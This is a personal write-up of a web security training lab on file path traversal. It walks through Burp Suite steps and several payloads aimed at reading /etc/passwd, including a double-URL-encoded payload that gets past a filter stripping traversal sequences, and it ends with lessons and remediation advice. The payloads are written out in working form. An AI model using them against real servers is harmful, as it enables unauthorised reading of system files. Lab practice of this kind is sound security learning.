## 🧪 Lab: File Path Traversal - Traversal Sequences Stripped with Superfluous URL-decode  
**Level**: Practitioner  
**Date**: June 14, 2025  
**Goal**: Read `/etc/passwd` despite sanitization and double encoding defenses.

---

### 🧰 Tools
- Burp Suite (Repeater / URL Encoder)

---

### 🧭 Steps

1. **Intercept product image URL**  
   - Capture image request from product page:
     ```
     GET /image?filename=218.png
     ```

2. **Send request to Repeater**

3. **Try standard payloads**  
   - Absolute path:
     ```
     /etc/passwd
     ```
   - Sequential path:
     ```
     ../../../etc/passwd
     ```
   - Recursive/obfuscated path:
     ```
     ....//....//....//....//etc/passwd
     ```
   - None of these work due to early input sanitization.

4. **Use clean traversal payload**

```
../../../../etc/passwd
```



5. **URL encode the payload once**  
- Result:
  ```
  %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
  ```

6. **URL encode it again (double encoding)**  
- Final payload:
  ```
  %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
  ```

7. **Send the double-encoded payload**  
- Lab is successfully solved and `/etc/passwd` contents are returned.

---

### 💣 Payload

  ```
  %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
  ```
---

### 💡 What I Learned
- Application sanitizes traversal sequences **before processing the input**.
- Basic and recursive payloads are stripped early — only **double encoding** works.
- URL encoding tricks can bypass flawed sanitization routines.
- Reinforced the importance of **server-side input validation**, not just client-side filters.

---

### 🔒 Remediation
- Sanitize and validate user input server-side.
- Apply **deep decoding** detection to identify malicious inputs.
- Prevent double-encoded payloads from being parsed into dangerous paths.
- Avoid exposing URLs for internal file access.

---

### 📌 Notes
- This lab inspired me to build a dedicated GitHub repo with common traversal payloads — from absolute to recursive and encoded variants.
- Learned to use Burp Suite Encoder effectively.
